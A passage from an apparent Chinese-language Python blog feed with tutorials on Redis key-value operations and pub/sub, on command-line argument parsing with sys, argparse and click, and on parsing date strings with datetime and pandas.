operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>connection_pool<span class="token operator">=</span>conn_pool<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="增删查改"><a href="#增删查改" class="headerlink" title="增删查改"></a>增删查改</h3></li></ul><p>既然是数据库，核心就是这几个操作，redis中采用键值对的方式存储数据，可以想象成一个字典。</p><ul><li><p>添加数据&amp;修改数据<br>  包含<code>set</code>和<code>mset</code>方法，后者是前者的多重，用于一次设置多个值。下面用具体代码展示；</p><ul><li><p><code>set(name, value, ex=None, px=None, nx=False, xx=False)</code></p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">redis_conn<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>redis_conn<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'data2'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span>ex<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>  <span class="token comment"># 设置10秒超时，超时后自动删除该数据，ex单位秒，px单位毫秒</span>redis_conn<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span>nx<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># 当`data`不存在时才创建</span>redis_conn<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span>xx<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># 当`data`存在时才创建</span>data_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'data3'</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">,</span>    <span class="token string">'data4'</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">&#125;</span>redis_conn<span class="token punctuation">.</span>mset<span class="token punctuation">(</span>data_dict<span class="token punctuation">)</span>  <span class="token comment"># 一次设置多个键值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>一般来说我们通常只用第一条，其他的几个也了解一下即可</p></blockquote><p>除此之外，还有一个用于在数据后面添加新数据的方法<code>append</code>，当数据不存在时新建，若存在，则添加到已有数据尾部，返回值是数据的长度</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">length <span class="token operator">=</span> redis_conn<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'666'</span><span class="token punctuation">)</span>  <span class="token comment"># data:b'10666',length:5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li></ul></li><li><p>查找数据<br>  包含<code>get</code>和<code>mget</code>方法，后者用于一次获取多个。注意返回的值是bytes对象。</p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">redis_conn<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>  <span class="token comment"># b'10' </span>query_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token string">'data2'</span><span class="token punctuation">,</span><span class="token string">'data3'</span><span class="token punctuation">,</span><span class="token string">'data4'</span><span class="token punctuation">]</span>redis_conn<span class="token punctuation">.</span>mget<span class="token punctuation">(</span>query_list<span class="token punctuation">)</span>  <span class="token comment"># [b'10', None, b'11', b'12']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></li><li>删除数据<br>  <code>delete</code>方法，允许删除单个或删除多个（根据键）  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">redis_conn<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>redis_conn<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token string">'data2'</span><span class="token punctuation">,</span><span class="token string">'data3'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div>上面主要是<code>string</code>类型数据在<code>redis</code>中的操作，<code>redis</code>还支持<code>List</code>,<code>Hash</code>,<code>Set</code>等多种类型，具体可以看这篇:<a href="https://www.cnblogs.com/jiyu-hlzy/p/11980427.html">Python对Redis增删改查</a>。</li></ul><h2 id="频道发布与订阅"><a href="#频道发布与订阅" class="headerlink" title="频道发布与订阅"></a>频道发布与订阅</h2><p><code>redis</code>允许发布频道，通过频道传达信息，其他对象可以订阅该频道以获取相应的信息，直观一点的理解就是<code>server</code>,<code>client</code>的<code>socket</code>通信。主要分为<code>发布端</code>和<code>订阅端</code>。</p><h3 id="发布端"><a href="#发布端" class="headerlink" title="发布端"></a>发布端</h3><p>例如我们用<code>redis</code>创建一个对象，通过<code>publish</code>方法发布一个频道，同时往该频道中输送信息：<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> redispool <span class="token operator">=</span> redis<span class="token punctuation">.</span>ConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'chaopeng'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>connection_pool<span class="token operator">=</span>pool<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"publish: >>"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>publish<span class="token punctuation">(</span>channel<span class="token operator">=</span><span class="token string">'cctv'</span><span class="token punctuation">,</span> message<span class="token operator">=</span>msg<span class="token punctuation">)</span>    <span class="token keyword">if</span> msg <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"结束发布"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br>启动效果：<br><img src="https://img-blog.csdnimg.cn/20200708124910352.png#pic_center =246x62" alt=""></p><h3 id="订阅端"><a href="#订阅端" class="headerlink" title="订阅端"></a>订阅端</h3><p>订阅端要想获取发布的信息，需要订阅相应频道，相当于client监听了指定端口：<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> redispool <span class="token operator">=</span> redis<span class="token punctuation">.</span>ConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'chaopeng'</span><span class="token punctuation">)</span>redis_conn <span class="token operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>connection_pool<span class="token operator">=</span>pool<span class="token punctuation">)</span>p <span class="token operator">=</span> redis_conn<span class="token punctuation">.</span>pubsub<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>subscribe<span class="token punctuation">(</span><span class="token string">"cctv"</span><span class="token punctuation">)</span><span class="token keyword">for</span> item <span class="token keyword">in</span> p<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在监听频道：&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token string">'channel'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">if</span> item<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'message'</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"频道 &#123;&#125; 发来新消息:&#123;&#125;"</span> <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token string">'channel'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">'exit'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token string">'channel'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'发布结束'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>p<span class="token punctuation">.</span>unsubscribe<span class="token punctuation">(</span><span class="token string">'cctv'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"取消订阅"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br>启动效果：<br><img src="https://img-blog.csdnimg.cn/2020070812511493.png#pic_center =284x131" alt=""><br>监听过程中主要传输的<code>item</code>具体包含下面的信息：</p><ul><li><p><code>type</code>:  <code>subscribe</code>, <code>unsubscribe</code>, <code>psubscribe</code>, <code>punsubscribe</code>, <code>message</code>, <code>pmessage</code>之一，用于识别监听到的数据类型，一般第一次订阅是<code>subscribe</code>,后面都是<code>message</code>。  </p><blockquote><p>{‘type’: ‘subscribe’, ‘pattern’: None, ‘channel’: b’cctv’, ‘data’: 1}</p></blockquote></li><li><p><code>channel</code>: 发布消息的频道</p></li><li><code>pattern</code>: 用于匹配发布消息的频道模式,一般而言，我们用不到这个，都是<code>None</code></li><li><code>data</code>: 具体的传输信息<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></li></ul><p><code>redis</code>是一个高速的内存数据库，在制作小有规模的项目时难免会遇到对于数据的临时存储，<code>redis</code>是一个很好的解决方案。在应用多进程的时候，可以很好地利用发布与订阅的机制进行消息的共享。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python如何优雅地在命令行传入参数？sys,argparse,click使用</title>
    <link href="/article/47448.html"/>
    <url>/article/47448.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一些大型的<code>python</code>项目经常性会提供命令行的接口使得同样一个文件能够根据参数的不同执行不同的操作。常见的如<code>python main.py --name=&#39;zhangsan&#39; --age=20</code>，这让用户能够需求选择不同的服务启动并选择不同的参数配置，实现这一操作的方法有很多，比较常见的是三种：<code>sys</code>,<code>argparse</code>,<code>click</code>。</p><h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p><code>sys</code>是<code>python</code>自带的模块，可以通过<code>sys.argv</code>获取到输入的参数，如下所示：<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    hello<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#  python3 test.py hey 23</span><span class="token comment"># >> ['test.py', 'hey', '23']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><code>sys.argv</code>返回一个列表，第一项是执行的文件名，后面依次是输入的未指定参数。</p><p>该模块十分简单易懂且方便使用，不过缺点也很明显，无法指定参数的名称，输入的参数必须按照指定顺序，且没有<code>help</code>打印帮助信息（指明每个参数的作用），需要开发者手动创建一个。</p><h2 id="argparse"><a href="#argparse" class="headerlink" title="argparse"></a>argparse</h2><p><code>argparse</code>是一个非常好用的命令行参数工具，相比于<code>sys</code>，它能够指定参数名称，参数默认值，参数的描述信息等，具体如下：<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> argparse<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>name<span class="token punctuation">,</span>args<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    my_arg <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token string">'My argument parser'</span><span class="token punctuation">)</span>    my_arg<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--name'</span><span class="token punctuation">,</span><span class="token string">'-n'</span><span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token string">'cp'</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Your name'</span><span class="token punctuation">)</span>    my_arg<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--age'</span><span class="token punctuation">,</span><span class="token string">'-a'</span><span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Your age'</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> my_arg<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    hello<span class="token punctuation">(</span>args<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><img src="https://img-blog.csdnimg.cn/2020073019470794.png#pic_center =970x215" alt=""><br>通过声明一个<code>ArgumentParser</code>对象，再为其添加相应的输入参数，最后进行<code>parse_args()</code>参数解析就可以获得从命令行输入的参数。这种方式的好处主要包括：</p><ul><li>参数顺序随意，按照参数名称指定且名称(<code>--name</code>)可以用简称(<code>-a</code>)减少输入</li><li>包含<code>help</code>帮助信息，可以让使用者快速理解每个参数的含义</li><li>可以设定默认值和数据类型</li></ul><p>但这种方式必须要给出参数名称，不像<code>sys</code>那样按顺序输入参数即可。</p><h2 id="click"><a href="#click" class="headerlink" title="click"></a>click</h2><p><code>click</code>这个模块也是我近期才用到的，在一些大型项目中出现较多（特别是<code>flask</code>的项目），用<code>click</code>能够用更少的代码实现与<code>argparse</code>类似的功能，且看起来更加简洁。<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> click<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">'--name'</span><span class="token punctuation">,</span>default<span class="token operator">=</span> <span class="token string">'cp'</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Your name'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">'--age'</span><span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Your age'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    hello<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><img src="https://img-blog.csdnimg.cn/2020073019592243.png#pic_center =1018x184" alt=""><br>可以发现<code>click</code>将一个函数(<code>hello()</code>)封装成了一个命令行接口，函数的输入参数由<code>option</code>提供的参数决定。需要注意的是<code>hello(name,age)</code>中的<code>name,age</code>参数名是与<code>option</code>指定的命令行参数名称对应的，因此不能任意改成其他名称。<code>click.option</code>还有一个参数<code>required</code>可以设置参数是否需要，如果设置<code>False</code>，且没有给定默认值，那返回结果是<code>None</code>，如果设定<code>True</code>且没有输入值则会报错。</p><ul><li><p><code>click.group</code><br>  <code>click</code>还有一个重要的方法<code>group</code>，他允许将多个函数接口连接起来，形成一组，然后依次执行，具体实例如下：</p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> click<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">one</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello one"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'second'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">"--name"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Your name"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">two</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello two: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">"--age"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Your age"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">three</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello three:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    one<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>two<span class="token punctuation">)</span>    one<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>three<span class="token punctuation">)</span>    one<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>  <img src="https://img-blog.csdnimg.cn/20200730202829551.png#pic_center =909x132" alt=""><br>  在这个例子中，我给<code>two()</code>函数的<code>command</code>添加了<code>name</code>属性，使得在调用的时候可以用<code>second</code>替代<code>two</code>进行接口调用。上面的方式的好处在于被<code>group</code>装饰的函数是我们确定一定要执行的，而另外两个加入<code>group</code>的函数则根据我们命令行参数的输入执行。</p></li><li><p><code>click.argument</code><br>  除了<code>click.option</code>添加参数以外，<code>click</code>还可以通过<code>click.argument</code>添加参数，与<code>option</code>不同的是，<code>argument</code>直接指定参数名(没有<code>--</code>)，且是按照顺序输入（有点类似<code>sys.argv</code>），如下例子：</p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> click<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>argument</span><span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>argument</span><span class="token punctuation">(</span><span class="token string">'port'</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ip:&#123;&#125;,port:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    hello<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># python3 test.py '10.1.1.1' 1234</span><span class="token comment"># >> ip:10.1.1.1,port:1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文讲述了三种在命令行执行<code>python</code>文件时传入参数的方式，<code>sys</code>胜在简便，在一般个人的小项目中可以图方便使用，<code>argparse</code>更为正式，对参数的传递有严格的把控，<code>click</code>兼具上面两者，且代码可读性强，适合大型的项目。三者根据自己需要选择使用。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>sys</tag>
      
      <tag>argparse</tag>
      
      <tag>click</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】字符串日期格式数据处理</title>
    <link href="/article/1104.html"/>
    <url>/article/1104.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>特征工程中经常性遇到字符串形式的日期数据，通常我们需要将其转换成计算机能够理解的<code>datetime</code>对象，好处在于可以实现日期早晚的比较(例如要筛选出<code>2019-01-02</code>到<code>2019-03-04</code>内的数据)，日期的加减法等系列操作。<code>python</code>实现该操作的模块是<code>datetime</code>，同时数据分析处理工具<code>pandas</code>也提供了相应的时间格式处理方法<code>to_datetime()</code>，本文从实用性角度出发，简要讲解这两种时间格式处理方式，并以一个具体的例子实际演示如何使用。</p><blockquote><p>注：本文关心的是对于给定的字符串类型时间数据，如何快速进行读取实例化，因此不会大篇幅地去详细介绍模块的各个功能。</p></blockquote><h2 id="datetime"><a href="#datetime" class="headerlink" title="datetime"></a>datetime</h2><p>由于<code>datetime</code>包含了众多对时间数据的处理、初始化操作，一一学习并没有特别大的效益，且很容易忘记，因此，适合在必要的时候查询使用。这里提供一篇对<code>datetime</code>使用讲解十分详细的文章：<a href="https://blog.csdn.net/cmzsteven/article/details/64906245">Python datetime模块详解、示例</a>。</p><blockquote><p>作者从<code>datetime</code>模块下所有的类进行了详细的介绍和使用，并附上了日期格式化符号，可以在需要的时候进行查询。</p></blockquote><h3 id="datetime处理字符串时间数据"><a href="#datetime处理字符串时间数据" class="headerlink" title="datetime处理字符串时间数据"></a>datetime处理字符串时间数据</h3><p>主要用到了<code>datetime.datetime.strptime()</code>，能够根据指定的日期格式符号，从字符串中抽取得到<code>datetime</code>实例。例如：<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetimedatetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span><span class="token string">'2019-01-03'</span><span class="token punctuation">,</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>  <span class="token comment"># datetime.datetime(2019, 1, 3, 0, 0)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><br><code>%Y(四位年份),%m(月份),%d(月内中的一天)</code>是日期的格式化符号，更多的符号含义参考上面给的文章，会自动检验日期的合法性，例如2月不可能有30号。<br>转换成<code>datetime</code>实例后，就可以做很多日期的骚操作了，例如：</p><ul><li><strong>比较两个日期的早晚</strong>    <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetimea <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span><span class="token string">'2019-02-20'</span><span class="token punctuation">,</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span><span class="token string">'2029-02-20'</span><span class="token punctuation">,</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>a <span class="token operator">&lt;</span> b  <span class="token comment"># True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></li><li><strong>计算两个日期相差间隔</strong>    <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetimea <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span><span class="token string">'2019-02-20'</span><span class="token punctuation">,</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span><span class="token string">'2029-02-20'</span><span class="token punctuation">,</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>b<span class="token operator">-</span>a  <span class="token comment"># datetime.timedelta(days=3653)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div>这个方法的缺点是一次只能处理单个时间字符串，若要处理大量的时间数据，就需要用for循环，开销上不如<code>pandas.to_datetime</code>，</li></ul><h2 id="pandas-to-datetime"><a href="#pandas-to-datetime" class="headerlink" title="pandas.to_datetime"></a>pandas.to_datetime</h2><p><code>pandas.to_datetime()</code>接收<code>Series</code>或列表等结构的数据，对其中所有字符串时间数据进行格式化操作，转换成<code>datetime</code>类型。例如：<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddates <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'2019-1-29'</span><span class="token punctuation">,</span><span class="token string">'2018/03/27'</span><span class="token punctuation">,</span><span class="token string">'2017-09-3'</span><span class="token punctuation">]</span>pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span>dates<span class="token punctuation">,</span><span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>   <span class="token comment"># DatetimeIndex(['2019-01-29', '2018-03-27', '2017-09-03'], dtype='datetime64[ns]', freq=None)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></p><blockquote><p>在上面的例子中我可以对分隔符和0前缀进行了变动，可以发现并不影响最终的结果</p></blockquote><p><code>to_datetime</code>还包含几个重要的参数：</p><ul><li><code>errors</code><ul><li><code>ignore</code>: 忽略解析错误，按照原始输入进行输出，用于在字符串中出现未知分割符号的时候，如<code>2019#08@13</code></li><li><code>raise(default)</code>: 但发现有无法解析的日期字符串时，报错</li><li><code>coerce</code>: 将无法解析的字符串删除为<code>NaT</code></li></ul></li><li><code>dayfirst</code>: 